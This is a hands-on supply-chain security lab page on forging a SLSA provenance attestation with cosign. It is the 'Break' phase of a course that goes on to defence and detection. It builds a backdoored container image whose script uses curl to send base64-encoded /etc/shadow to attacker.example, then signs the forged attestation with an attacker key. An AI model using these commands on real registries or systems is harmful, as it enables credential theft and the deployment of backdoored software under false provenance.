# Lab 4.6: Attestation Forgery

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Forge an Attestation for a Malicious Artifact

### Step 1: Build a backdoored image

```bash
cat > /tmp/Dockerfile.backdoor << 'EOF'
FROM registry:5000/webapp:signed
RUN echo '#!/bin/sh' > /usr/local/bin/update && \
    echo 'curl http://attacker.example/exfil?data=$(cat /etc/shadow | base64)' >> /usr/local/bin/update && \
    chmod +x /usr/local/bin/update
EOF

docker build -f /tmp/Dockerfile.backdoor -t registry:5000/webapp:backdoor .
docker push registry:5000/webapp:backdoor
MALICIOUS_DIGEST=$(crane digest registry:5000/webapp:backdoor)
echo "Malicious image digest: $MALICIOUS_DIGEST"
```

### Step 2: Generate an attacker key pair

```bash
cosign generate-key-pair --output-key-prefix attacker
```

### Step 3: Craft the forged attestation

```bash
cat > /tmp/forged-attestation.json << EOF
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "subject": [
    {
      "name": "registry:5000/webapp",
      "digest": {
        "sha256": "$(echo $MALICIOUS_DIGEST | sed 's/sha256://')"
      }
    }
  ],
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": {
      "id": "https://github.com/actions/runner"
    },
    "buildType": "https://github.com/actions/runner/github-hosted",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/org/webapp@refs/heads/main",
        "digest": {"sha1": "abc123def456"},
        "entryPoint": ".github/workflows/build.yml"
      }
    }
  }
}
EOF
```

Every field is a lie, but the JSON structure is valid.

### Step 4: Sign the forged attestation

```bash
cosign attest --key attacker.key --predicate /tmp/forged-attestation.json \
  --type slsaprovenance registry:5000/webapp:backdoor
```

### Step 5: Verify. it passes

```bash
cosign verify-attestation --key attacker.pub registry:5000/webapp:backdoor | jq .
```

Verification succeeds. The signature is mathematically valid. A consumer who trusts the attacker's public key (or does not pin which signing key to trust and instead accepts any valid cosign signature) will deploy the backdoored image.

> **Checkpoint:** You should have a forged attestation on `registry:5000/webapp:backdoor` that passes `cosign verify-attestation --key attacker.pub`. Confirm it fails with the legitimate key.
